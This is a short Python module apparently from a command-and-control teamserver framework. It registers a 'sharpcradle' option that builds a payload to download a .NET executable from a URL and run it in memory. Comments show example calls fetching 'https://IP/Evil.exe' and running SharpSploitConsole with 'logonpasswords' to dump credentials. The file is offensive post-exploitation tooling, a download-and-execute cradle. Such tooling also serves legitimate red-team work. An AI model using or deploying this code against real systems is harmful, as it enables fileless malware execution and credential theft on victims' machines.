#referenced from: https://github.com/anthemtotheego/SharpCradle
#Options ported:
#SharpCradle.exe -w https://IP/Evil.exe <arguments to pass>
#SharpCradle.exe -w https://IP/SharpSploitConsole_x64.exe logonpasswords

from core.teamserver.module import Module


class STModule(Module):
    def __init__(self):
        self.name = 'boo/sharpcradle'
        self.language = 'boo'
        self.description = 'Execute remote .NET assembly from URL in memory.'
        self.author = '@hackabean, @anthemtotheego'
        self.references = []
        self.options = {
            'Assembly': {
                'Description': 'The URL path to the compiled (EXE) assembly.',
                'Required': True,
                'Value': ""
            },
            'Arguments': {
                'Description': 'Arguments to pass to the assembly on runtime.',
                'Required': True,
                'Value': ""
            }
        }

    def payload(self):
        with open('core/teamserver/modules/boo/src/sharpcradle.boo', 'r') as module_src:
            src = module_src.read()
            src = src.replace('BINARY', str(self.options['Assembly']['Value']))
            src = src.replace('ARGUMENTS', str(self.options['Arguments']['Value']))
            return src